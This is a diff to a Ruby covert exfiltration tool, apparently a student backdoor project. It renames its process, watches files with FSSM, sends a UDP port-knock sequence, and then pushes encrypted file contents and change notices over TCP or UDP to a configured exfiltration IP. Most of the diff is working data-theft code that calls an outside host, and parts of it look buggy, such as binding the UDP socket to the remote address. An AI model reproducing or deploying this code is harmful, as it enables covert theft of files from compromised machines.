@@ -37,6 +37,7 @@
 require 'packetfu'
 require 'openssl'
 require 'fssm'
+require 'socket'
 require_relative 'util.rb'
 
 # rename process immediately
@@ -128,28 +129,30 @@ def start_watch(type, name)
     #glob = 
     #path = 
   end
+
+  monitor = FSSM::Monitor.new
+  monitor.path path, glob do
+    update { |base, relative|
+      puts "#{base}/#{relative} has been updated"
+      send_out(:file, "#{base}/#{relative}")
+    }
+    delete { |base, relative|
+      puts "#{base}/#{relative} has been deleted"
+      send_out(:msg, "#{base}/#{relative} has been deleted")
+    }
+    create { |base, relative|
+      puts "#{base}/#{relative} has been created"
+      send_out(:msg, "#{base}/#{relative}")
+    }
+  end
   t = Thread.new {
     begin
-      FSSM.monitor(path, glob) do ############THIS IS BLOCKING??? fix this
-        update { |base, relative|
-          puts "#{base}/#{relative} has been updated"
-          send_out(:file, "#{base}/#{relative}")
-        }
-        delete { |base, relative|
-          puts "#{base}/#{relative} has been deleted"
-          send_out(:msg, "#{base}/#{relative} has been deleted")
-        }
-        create { |base, relative|
-          puts "#{base}/#{relative} has been created"
-          send_out(:file, "#{base}/#{relative}")
-        }
-      end
+      monitor.run
     rescue Exception => e
       puts "bad stuff in monitor"
       puts e.message
     end
   }
-  t.join
   puts "watch on #{name} started"
 end
 
@@ -161,10 +164,37 @@ end
 # - if delete, message that its been deleted with path
 #   if update or create, passes the pathname to send file
 def send_out(mode, data)
+  socket = nil
+  if $cfg_exfil_protocol == UDP
+    socket = UDPSocket.new
+    socket.bind($cfg_exfil_ip, $cfg_pen_port.to_i)
+  elsif $cfg_exfil_protocol == TCP
+    socket = TCPSocket.new($cfg_exfil_ip, $cfg_pen_port.to_i)
+  else
+    #not implemneted protocol
+  end
+      
   if mode == :file
     generate_knock_seq
+    File.open(data, "rb") do |f|
+      fp = f.readlines
+      if $cfg_exfil_protocol == UDP
+        socket.send(encrypt(fp))
+      elsif $cfg_exfil_protocol == TCP
+        socket.puts(encrypt(fp))
+      else
+        #not implemneted protocol
+      end
+    end
   elsif mode == :msg
     generate_knock_seq
+    if $cfg_exfil_protocol == UDP
+        socket.send(encrypt(data))
+      elsif $cfg_exfil_protocol == TCP
+        socket.puts(encrypt(data))
+      else
+        #not implemneted protocol
+      end
   else
     #should probs not get here
   end     
@@ -192,17 +222,17 @@ def generate_knock_seq
     begin
       3.times {
         udp_packet(iface_config, 44444, covert_config)
-        sleep 0.2
+        sleep 1
       }
       sleep 2
       3.times {
         udp_packet(iface_config, 55555, covert_config)
-        sleep 0.2
+        sleep 1
       }
       sleep 2
       3.times {
         udp_packet(iface_config, 44544, covert_config)
-        sleep 0.2
+        sleep 1
       }
       sleep 5
     rescue Exception => e
